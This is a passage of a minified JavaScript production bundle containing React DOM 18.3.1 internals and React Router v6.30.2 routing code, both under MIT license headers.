e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),Kv(t,n)}function Ry(t,e){var n=0;switch(t.tag){case 13:var i=t.stateNode,s=t.memoizedState;s!==null&&(n=s.retryLane);break;case 19:i=t.stateNode;break;default:throw Error(se(314))}i!==null&&i.delete(e),Kv(t,n)}var Zv;Zv=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||un.current)cn=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return cn=!1,gy(t,e,n);cn=!!(t.flags&131072)}else cn=!1,ft&&e.flags&1048576&&tv(e,yl,e.index);switch(e.lanes=0,e.tag){case 2:var i=e.type;Jo(t,e),t=e.pendingProps;var s=Tr(e,Kt.current);Sr(e,n),s=Ip(null,e,i,t,s,n);var r=Dp();return e.flags|=1,typeof s=="object"&&s!==null&&typeof s.render=="function"&&s.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,dn(i)?(r=!0,_l(e)):r=!1,e.memoizedState=s.state!==null&&s.state!==void 0?s.state:null,Rp(e),s.updater=jl,e.stateNode=s,s._reactInternals=e,Wu(e,i,t,n),e=qu(null,e,i,!0,r,n)):(e.tag=0,ft&&r&&bp(e),Qt(null,e,s,n),e=e.child),e;case 16:i=e.elementType;e:{switch(Jo(t,e),t=e.pendingProps,s=i._init,i=s(i._payload),e.type=i,s=e.tag=ky(i),t=zn(i,t),s){case 0:e=Xu(null,e,i,t,n);break e;case 1:e=xf(null,e,i,t,n);break e;case 11:e=vf(null,e,i,t,n);break e;case 14:e=_f(null,e,i,zn(i.type,t),n);break e}throw Error(se(306,i,""))}return e;case 0:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:zn(i,s),Xu(t,e,i,s,n);case 1:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:zn(i,s),xf(t,e,i,s,n);case 3:e:{if(Iv(e),t===null)throw Error(se(387));i=e.pendingProps,r=e.memoizedState,s=r.element,ov(t,e),wl(e,i,null,n);var a=e.memoizedState;if(i=a.element,r.isDehydrated)if(r={element:i,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},e.updateQueue.baseState=r,e.memoizedState=r,e.flags&256){s=Pr(Error(se(423)),e),e=yf(t,e,i,n,s);break e}else if(i!==s){s=Pr(Error(se(424)),e),e=yf(t,e,i,n,s);break e}else for(Sn=es(e.stateNode.containerInfo.firstChild),bn=e,ft=!0,Hn=null,n=rv(e,null,i,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(Ar(),i===s){e=Pi(t,e,n);break e}Qt(t,e,i,n)}e=e.child}return e;case 5:return lv(e),t===null&&Vu(e),i=e.type,s=e.pendingProps,r=t!==null?t.memoizedProps:null,a=s.children,Uu(i,s)?a=null:r!==null&&Uu(i,r)&&(e.flags|=32),Nv(t,e),Qt(t,e,a,n),e.child;case 6:return t===null&&Vu(e),null;case 13:return Dv(t,e,n);case 4:return Pp(e,e.stateNode.containerInfo),i=e.pendingProps,t===null?e.child=Cr(e,null,i,n):Qt(t,e,i,n),e.child;case 11:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:zn(i,s),vf(t,e,i,s,n);case 7:return Qt(t,e,e.pendingProps,n),e.child;case 8:return Qt(t,e,e.pendingProps.children,n),e.child;case 12:return Qt(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(i=e.type._context,s=e.pendingProps,r=e.memoizedProps,a=s.value,dt(Sl,i._currentValue),i._currentValue=a,r!==null)if(Yn(r.value,a)){if(r.children===s.children&&!un.current){e=Pi(t,e,n);break e}}else for(r=e.child,r!==null&&(r.return=e);r!==null;){var o=r.dependencies;if(o!==null){a=r.child;for(var l=o.firstContext;l!==null;){if(l.context===i){if(r.tag===1){l=Ei(-1,n&-n),l.tag=2;var c=r.updateQueue;if(c!==null){c=c.shared;var p=c.pending;p===null?l.next=l:(l.next=p.next,p.next=l),c.pending=l}}r.lanes|=n,l=r.alternate,l!==null&&(l.lanes|=n),Hu(r.return,n,e),o.lanes|=n;break}l=l.next}}else if(r.tag===10)a=r.type===e.type?null:r.child;else if(r.tag===18){if(a=r.return,a===null)throw Error(se(341));a.lanes|=n,o=a.alternate,o!==null&&(o.lanes|=n),Hu(a,n,e),a=r.sibling}else a=r.child;if(a!==null)a.return=r;else for(a=r;a!==null;){if(a===e){a=null;break}if(r=a.sibling,r!==null){r.return=a.return,a=r;break}a=a.return}r=a}Qt(t,e,s.children,n),e=e.child}return e;case 9:return s=e.type,i=e.pendingProps.children,Sr(e,n),s=In(s),i=i(s),e.flags|=1,Qt(t,e,i,n),e.child;case 14:return i=e.type,s=zn(i,e.pendingProps),s=zn(i.type,s),_f(t,e,i,s,n);case 15:return kv(t,e,e.type,e.pendingProps,n);case 17:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:zn(i,s),Jo(t,e),e.tag=1,dn(i)?(t=!0,_l(e)):t=!1,Sr(e,n),Cv(e,i,s),Wu(e,i,s,n),qu(null,e,i,!0,t,n);case 19:return Uv(t,e,n);case 22:return Lv(t,e,n)}throw Error(se(156,e.tag))};function Jv(t,e){return Mg(t,e)}function Py(t,e,n,i){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=i,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function kn(t,e,n,i){return new Py(t,e,n,i)}function jp(t){return t=t.prototype,!(!t||!t.isReactComponent)}function ky(t){if(typeof t=="function")return jp(t)?1:0;if(t!=null){if(t=t.$$typeof,t===up)return 11;if(t===dp)return 14}return 2}function ss(t,e){var n=t.alternate;return n===null?(n=kn(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function tl(t,e,n,i,s,r){var a=2;if(i=t,typeof t=="function")jp(t)&&(a=1);else if(typeof t=="string")a=5;else e:switch(t){case rr:return Ls(n.children,s,r,e);case cp:a=8,s|=8;break;case fu:return t=kn(12,n,e,s|2),t.elementType=fu,t.lanes=r,t;case mu:return t=kn(13,n,e,s),t.elementType=mu,t.lanes=r,t;case gu:return t=kn(19,n,e,s),t.elementType=gu,t.lanes=r,t;case lg:return Yl(n,s,r,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case ag:a=10;break e;case og:a=9;break e;case up:a=11;break e;case dp:a=14;break e;case Hi:a=16,i=null;break e}throw Error(se(130,t==null?t:typeof t,""))}return e=kn(a,n,e,s),e.elementType=t,e.type=i,e.lanes=r,e}function Ls(t,e,n,i){return t=kn(7,t,i,e),t.lanes=n,t}function Yl(t,e,n,i){return t=kn(22,t,i,e),t.elementType=lg,t.lanes=n,t.stateNode={isHidden:!1},t}function kc(t,e,n){return t=kn(6,t,null,e),t.lanes=n,t}function Lc(t,e,n){return e=kn(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function Ly(t,e,n,i,s){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=pc(0),this.expirationTimes=pc(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=pc(0),this.identifierPrefix=i,this.onRecoverableError=s,this.mutableSourceEagerHydrationData=null}function Xp(t,e,n,i,s,r,a,o,l){return t=new Ly(t,e,n,o,l),e===1?(e=1,r===!0&&(e|=8)):e=0,r=kn(3,null,null,e),t.current=r,r.stateNode=t,r.memoizedState={element:i,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Rp(r),t}function Ny(t,e,n){var i=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:sr,key:i==null?null:""+i,children:t,containerInfo:e,implementation:n}}function Qv(t){if(!t)return os;t=t._reactInternals;e:{if(zs(t)!==t||t.tag!==1)throw Error(se(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(dn(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(se(171))}if(t.tag===1){var n=t.type;if(dn(n))return Qg(t,n,e)}return e}function e0(t,e,n,i,s,r,a,o,l){return t=Xp(n,i,!0,t,s,r,a,o,l),t.context=Qv(null),n=t.current,i=en(),s=is(n),r=Ei(i,s),r.callback=e??null,ts(n,r,s),t.current.lanes=s,qa(t,s,i),pn(t,i),t}function $l(t,e,n,i){var s=e.current,r=en(),a=is(s);return n=Qv(n),e.context===null?e.context=n:e.pendingContext=n,e=Ei(r,a),e.payload={element:t},i=i===void 0?null:i,i!==null&&(e.callback=i),t=ts(s,e,a),t!==null&&(qn(t,s,a,r),$o(t,s,a)),a}function kl(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function Pf(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function qp(t,e){Pf(t,e),(t=t.alternate)&&Pf(t,e)}function Iy(){return null}var t0=typeof reportError=="function"?reportError:function(t){console.error(t)};function Yp(t){this._internalRoot=t}Kl.prototype.render=Yp.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(se(409));$l(t,e,null,null)};Kl.prototype.unmount=Yp.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;Os(function(){$l(null,t,null,null)}),e[Ci]=null}};function Kl(t){this._internalRoot=t}Kl.prototype.unstable_scheduleHydration=function(t){if(t){var e=Lg();t={blockedOn:null,target:t,priority:e};for(var n=0;n<Wi.length&&e!==0&&e<Wi[n].priority;n++);Wi.splice(n,0,t),n===0&&Ig(t)}};function $p(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function Zl(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function kf(){}function Dy(t,e,n,i,s){if(s){if(typeof i=="function"){var r=i;i=function(){var c=kl(a);r.call(c)}}var a=e0(e,i,t,0,null,!1,!1,"",kf);return t._reactRootContainer=a,t[Ci]=a.current,Ra(t.nodeType===8?t.parentNode:t),Os(),a}for(;s=t.lastChild;)t.removeChild(s);if(typeof i=="function"){var o=i;i=function(){var c=kl(l);o.call(c)}}var l=Xp(t,0,!1,null,null,!1,!1,"",kf);return t._reactRootContainer=l,t[Ci]=l.current,Ra(t.nodeType===8?t.parentNode:t),Os(function(){$l(e,l,n,i)}),l}function Jl(t,e,n,i,s){var r=n._reactRootContainer;if(r){var a=r;if(typeof s=="function"){var o=s;s=function(){var l=kl(a);o.call(l)}}$l(e,a,t,s)}else a=Dy(n,e,t,s,i);return kl(a)}Pg=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=oa(e.pendingLanes);n!==0&&(fp(e,n|1),pn(e,wt()),!(Xe&6)&&(kr=wt()+500,ds()))}break;case 13:Os(function(){var i=Ri(t,1);if(i!==null){var s=en();qn(i,t,1,s)}}),qp(t,1)}};mp=function(t){if(t.tag===13){var e=Ri(t,134217728);if(e!==null){var n=en();qn(e,t,134217728,n)}qp(t,134217728)}};kg=function(t){if(t.tag===13){var e=is(t),n=Ri(t,e);if(n!==null){var i=en();qn(n,t,e,i)}qp(t,e)}};Lg=function(){return st};Ng=function(t,e){var n=st;try{return st=t,e()}finally{st=n}};Tu=function(t,e,n){switch(e){case"input":if(xu(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var i=n[e];if(i!==t&&i.form===t.form){var s=Hl(i);if(!s)throw Error(se(90));ug(i),xu(i,s)}}}break;case"textarea":pg(t,n);break;case"select":e=n.value,e!=null&&vr(t,!!n.multiple,e,!1)}};xg=Hp;yg=Os;var Uy={usingClientEntryPoint:!1,Events:[$a,cr,Hl,vg,_g,Hp]},Zr={findFiberByHostInstance:Ts,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Oy={bundleType:Zr.bundleType,version:Zr.version,rendererPackageName:Zr.rendererPackageName,rendererConfig:Zr.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Ni.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=wg(t),t===null?null:t.stateNode},findFiberByHostInstance:Zr.findFiberByHostInstance||Iy,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var wo=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!wo.isDisabled&&wo.supportsFiber)try{Fl=wo.inject(Oy),si=wo}catch{}}En.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Uy;En.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!$p(e))throw Error(se(200));return Ny(t,e,null,n)};En.createRoot=function(t,e){if(!$p(t))throw Error(se(299));var n=!1,i="",s=t0;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(i=e.identifierPrefix),e.onRecoverableError!==void 0&&(s=e.onRecoverableError)),e=Xp(t,1,!1,null,null,n,!1,i,s),t[Ci]=e.current,Ra(t.nodeType===8?t.parentNode:t),new Yp(e)};En.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(se(188)):(t=Object.keys(t).join(","),Error(se(268,t)));return t=wg(e),t=t===null?null:t.stateNode,t};En.flushSync=function(t){return Os(t)};En.hydrate=function(t,e,n){if(!Zl(e))throw Error(se(200));return Jl(null,t,e,!0,n)};En.hydrateRoot=function(t,e,n){if(!$p(t))throw Error(se(405));var i=n!=null&&n.hydratedSources||null,s=!1,r="",a=t0;if(n!=null&&(n.unstable_strictMode===!0&&(s=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onRecoverableError!==void 0&&(a=n.onRecoverableError)),e=e0(e,null,t,1,n??null,s,!1,r,a),t[Ci]=e.current,Ra(t),i)for(t=0;t<i.length;t++)n=i[t],s=n._getVersion,s=s(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,s]:e.mutableSourceEagerHydrationData.push(n,s);return new Kl(e)};En.render=function(t,e,n){if(!Zl(e))throw Error(se(200));return Jl(null,t,e,!1,n)};En.unmountComponentAtNode=function(t){if(!Zl(t))throw Error(se(40));return t._reactRootContainer?(Os(function(){Jl(null,null,t,!1,function(){t._reactRootContainer=null,t[Ci]=null})}),!0):!1};En.unstable_batchedUpdates=Hp;En.unstable_renderSubtreeIntoContainer=function(t,e,n,i){if(!Zl(n))throw Error(se(200));if(t==null||t._reactInternals===void 0)throw Error(se(38));return Jl(t,e,n,!1,i)};En.version="18.3.1-next-f1338f8080-20240426";function n0(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n0)}catch(t){console.error(t)}}n0(),ng.exports=En;var Fy=ng.exports,i0,Lf=Fy;i0=Lf.createRoot,Lf.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Fa(){return Fa=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},Fa.apply(this,arguments)}var $i;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})($i||($i={}));const Nf="popstate";function By(t){t===void 0&&(t={});function e(i,s){let{pathname:r,search:a,hash:o}=i.location;return rd("",{pathname:r,search:a,hash:o},s.state&&s.state.usr||null,s.state&&s.state.key||"default")}function n(i,s){return typeof s=="string"?s:Ll(s)}return Vy(e,n,null,t)}function Ct(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function Kp(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function zy(){return Math.random().toString(36).substr(2,8)}function If(t,e){return{usr:t.state,key:t.key,idx:e}}function rd(t,e,n,i){return n===void 0&&(n=null),Fa({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?zr(e):e,{state:n,key:e&&e.key||i||zy()})}function Ll(t){let{pathname:e="/",search:n="",hash:i=""}=t;return n&&n!=="?"&&(e+=n.charAt(0)==="?"?n:"?"+n),i&&i!=="#"&&(e+=i.charAt(0)==="#"?i:"#"+i),e}function zr(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substr(n),t=t.substr(0,n));let i=t.indexOf("?");i>=0&&(e.search=t.substr(i),t=t.substr(0,i)),t&&(e.pathname=t)}return e}function Vy(t,e,n,i){i===void 0&&(i={});let{window:s=document.defaultView,v5Compat:r=!1}=i,a=s.history,o=$i.Pop,l=null,c=p();c==null&&(c=0,a.replaceState(Fa({},a.state,{idx:c}),""));function p(){return(a.state||{idx:null}).idx}function d(){o=$i.Pop;let m=p(),u=m==null?null:m-c;c=m,l&&l({action:o,location:y.location,delta:u})}function h(m,u){o=$i.Push;let g=rd(y.location,m,u);c=p()+1;let _=If(g,c),b=y.createHref(g);try{a.pushState(_,"",b)}catch(T){if(T instanceof DOMException&&T.name==="DataCloneError")throw T;s.location.assign(b)}r&&l&&l({action:o,location:y.location,delta:1})}function f(m,u){o=$i.Replace;let g=rd(y.location,m,u);c=p();let _=If(g,c),b=y.createHref(g);a.replaceState(_,"",b),r&&l&&l({action:o,location:y.location,delta:0})}function v(m){let u=s.location.origin!=="null"?s.location.origin:s.location.href,g=typeof m=="string"?m:Ll(m);return g=g.replace(/ $/,"%20"),Ct(u,"No window.location.(origin|href) available to create URL for href: "+g),new URL(g,u)}let y={get action(){return o},get location(){return t(s,a)},listen(m){if(l)throw new Error("A history only accepts one active listener");return s.addEventListener(Nf,d),l=m,()=>{s.removeEventListener(Nf,d),l=null}},createHref(m){return e(s,m)},createURL:v,encodeLocation(m){let u=v(m);return{pathname:u.pathname,search:u.search,hash:u.hash}},push:h,replace:f,go(m){return a.go(m)}};return y}var Df;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(Df||(Df={}));function Hy(t,e,n){return n===void 0&&(n="/"),Gy(t,e,n)}function Gy(t,e,n,i){let s=typeof e=="string"?zr(e):e,r=Zp(s.pathname||"/",n);if(r==null)return null;let a=s0(t);Wy(a);let o=null;for(let l=0;o==null&&l<a.length;++l){let c=nS(r);o=Qy(a[l],c)}return o}function s0(t,e,n,i){e===void 0&&(e=[]),n===void 0&&(n=[]),i===void 0&&(i="");let s=(r,a,o)=>{let l={relativePath:o===void 0?r.path||"":o,caseSensitive:r.caseSensitive===!0,childrenIndex:a,route:r};l.relativePath.startsWith("/")&&(Ct(l.relativePath.startsWith(i),'Absolute route path "'+l.relativePath+'" nested under path '+('"'+i+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),l.relativePath=l.relativePath.slice(i.length));let c=rs([i,l.relativePath]),p=n.concat(l);r.children&&r.children.length>0&&(Ct(r.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),s0(r.children,e,p,c)),!(r.path==null&&!r.index)&&e.push({path:c,score:Zy(c,r.index),routesMeta:p})};return t.forEach((r,a)=>{var o;if(r.path===""||!((o=r.path)!=null&&o.includes("?")))s(r,a);else for(let l of r0(r.path))s(r,a,l)}),e}function r0(t){let e=t.split("/");if(e.length===0)return[];let[n,...i]=e,s=n.endsWith("?"),r=n.replace(/\?$/,"");if(i.length===0)return s?[r,""]:[r];let a=r0(i.join("/")),o=[];return o.push(...a.map(l=>l===""?r:[r,l].join("/"))),s&&o.push(...a),o.map(l=>t.startsWith("/")&&l===""?"/":l)}function Wy(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:Jy(e.routesMeta.map(i=>i.childrenIndex),n.routesMeta.map(i=>i.childrenIndex)))}const jy=/^:[\w-]+$/,Xy=3,qy=2,Yy=1,$y=10,Ky=-2,Uf=t=>t==="*";function Zy(t,e){let n=t.split("/"),i=n.length;return n.some(Uf)&&(i+=Ky),e&&(i+=qy),n.filter(s=>!Uf(s)).reduce((s,r)=>s+(jy.test(r)?Xy:r===""?Yy:$y),i)}function Jy(t,e){return t.length===e.length&&t.slice(0,-1).every((i,s)=>i===e[s])?t[t.length-1]-e[e.length-1]:0}function Qy(t,e,n){let{routesMeta:i}=t,s={},r="/",a=[];for(let o=0;o<i.length;++o){let l=i[o],c=o===i.length-1,p=r==="/"?e:e.slice(r.length)||"/",d=eS({path:l.relativePath,caseSensitive:l.caseSensitive,end:c},p),h=l.route;if(!d)return null;Object.assign(s,d.params),a.push({params:s,pathname:rs([r,d.pathname]),pathnameBase:oS(rs([r,d.pathnameBase])),route:h}),d.pathnameBase!=="/"&&(r=rs([r,d.pathnameBase]))}return a}function eS(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,i]=tS(t.path,t.caseSensitive,t.end),s=e.match(n);if(!s)return null;let r=s[0],a=r.replace(/(.)\/+$/,"$1"),o=s.slice(1);return{params:i.reduce((c,p,d)=>{let{paramName:h,isOptional:f}=p;if(h==="*"){let y=o[d]||"";a=r.slice(0,r.length-y.length).replace(/(.)\/+$/,"$1")}const v=o[d];return f&&!v?c[h]=void 0:c[h]=(v||"").replace(/%2F/g,"/"),c},{}),pathname:r,pathnameBase:a,pattern:t}}function tS(t,e,n){e===void 0&&(e=!1),n===void 0&&(n=!0),Kp(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let i=[],s="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,o,l)=>(i.push({paramName:o,isOptional:l!=null}),l?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(i.push({paramName:"*"}),s+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?s+="\\/*$":t!==""&&t!=="/"&&(s+="(?:(?=\\/|$))"),[new RegExp(s,e?void 0:"i"),i]}function nS(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return Kp(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function Zp(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,i=t.charAt(n);return i&&i!=="/"?null:t.slice(n)||"/"}const iS=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,sS=t=>iS.test(t);function rS(t,e){e===void 0&&(e="/");let{pathname:n,search:i="",hash:s=""}=typeof t=="string"?zr(t):t,r;if(n)if(sS(n))r=n;else{if(n.includes("//")){let a=n;n=n.replace(/\/\/+/g,"/"),Kp(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+n))}n.startsWith("/")?r=Of(n.substring(1),"/"):r=Of(n,e)}else r=e;return{pathname:r,search:lS(i),hash:cS(s)}}function Of(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(s=>{s===".."?n.length>1&&n.pop():s!=="."&&n.push(s)}),n.length>1?n.join("/"):"/"}function Nc(t,e,n,i){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(i)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function aS(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function a0(t,e){let n=aS(t);return e?n.map((i,s)=>s===n.length-1?i.pathname:i.pathnameBase):n.map(i=>i.pathnameBase)}function o0(t,e,n,i){i===void 0&&(i=!1);let s;typeof t=="string"?s=zr(t):(s=Fa({},t),Ct(!s.pathname||!s.pathname.includes("?"),Nc("?","pathname","search",s)),Ct(!s.pathname||!s.pathname.includes("#"),Nc("#","pathname","hash",s)),Ct(!s.search||!s.search.includes("#"),Nc("#","search","hash",s)));let r=t===""||s.pathname==="",a=r?"/":s.pathname,o;if(a==null)o=n;else{let d=e.length-1;if(!i&&a.startsWith("..")){let h=a.split("/");for(;h[0]==="..";)h.shift(),d-=1;s.pathname=h.join("/")}o=d>=0?e[d]:"/"}let l=rS(s,o),c=a&&a!=="/"&&a.endsWith("/"),p=(r||a===".")&&n.endsWith("/");return!l.pathname.endsWith("/")&&(c||p)&&(l.pathname+="/"),l}const rs=t=>t.join("/").replace(/\/\/+/g,"/"),oS=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),lS=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,cS=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function uS(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const l0=["post","put","patch","delete"];new Set(l0);const dS=["get",...l0];new Set(dS);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ba(){return Ba=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},Ba.apply(this,arguments)}const Jp=Q.createContext(null),pS=Q.createContext(null),Vs=Q.createContext(null),Ql=Q.createContext(null),ps=Q.createContext({outlet:null,matches:[],isDataRoute:!1}),c0=Q.createContext(null);function hS(t,e){let{relative:n}=e===void 0?{}:e;Za()||Ct(!1);let{basename:i,navigator:s}=Q.useContext(Vs),{hash:r,pathname:a,search:o}=p0(t,{relative:n}),l=a;return i!=="/"&&(l=a==="/"?i:rs([i,a])),s.createHref({pathname:l,search:o,hash:r})}function Za(){return Q.useContext(Ql)!=null}function Ja(){return Za()||Ct(!1),Q.useContext(Ql).location}function u0(t){Q.useContext(Vs).static||Q.useLayoutEffect(t)}function d0(){let{isDataRoute:t}=Q.useContext(ps);return t?AS():fS()}function fS(){Za()||Ct(!1);let t=Q.useContext(Jp),{basename:e,future:n,navigator:i}=Q.useContext(Vs),{matches:s}=Q.useContext(ps),{pathname:r}=Ja(),a=JSON.stringify(a0(s,n.v7_relativeSplatPath)),o=Q.useRef(!1);return u0(()=>{o.current=!0}),Q.useCallback(function(c,p){if(p===void 0&&(p={}),!o.current)return;if(typeof c=="number"){i.go(c);return}let d=o0(c,JSON.parse(a),r,p.relative==="path");t==null&&e!=="/"&&(d.pathname=d.pathname==="/"?e:rs([e,d.pathname])),(p.replace?i.replace:i.push)(d,p.state,p)},[e,i,a,r,t])}function mS(){let{matches:t}=Q.useContext(ps),e=t[t.length-1];return e?e.params:{}}function p0(t,e){let{relative:n}=e===void 0?{}:e,{future:i}=Q.useContext(Vs),{matches:s}=Q.useContext(ps),{pathname:r}=Ja(),a=JSON.stringify(a0(s,i.v7_relativeSplatPath));return Q.useMemo(()=>o0(t,JSON.parse(a),r,n==="path"),[t,a,r,n])}function gS(t,e){return vS(t,e)}function vS(t,e,n,i){Za()||Ct(!1);let{navigator:s}=Q.useContext(Vs),{matches:r}=Q.useContext(ps),a=r[r.length-1],o=a?a.params:{};a&&a.pathname;let l=a?a.pathnameBase:"/";a&&a.route;let c=Ja(),p;if(e){var d;let m=typeof e=="string"?zr(e):e;l==="/"||(d=m.pathname)!=null&&d.startsWith(l)||Ct(!1),p=m}else p=c;let h=p.pathname||"/",f=h;if(l!=="/"){let m=l.replace(/^\//,"").split("/");f="/"+h.replace(/^\//,"").split("/").slice(m.length).join("/")}let v=Hy(t,{pathname:f}),y=bS(v&&v.map(m=>Object.assign({},m,{params:Object.assign({},o,m.params),pathname:rs([l,s.encodeLocation?s.encodeLocation(m.pathname).pathname:m.pathname]),pathnameBase:m.pathnameBase==="/"?l:rs([l,s.encodeLocation?s.encodeLocation(m.pathnameBase).pathname:m.pathnameBase])})),r,n,i);return 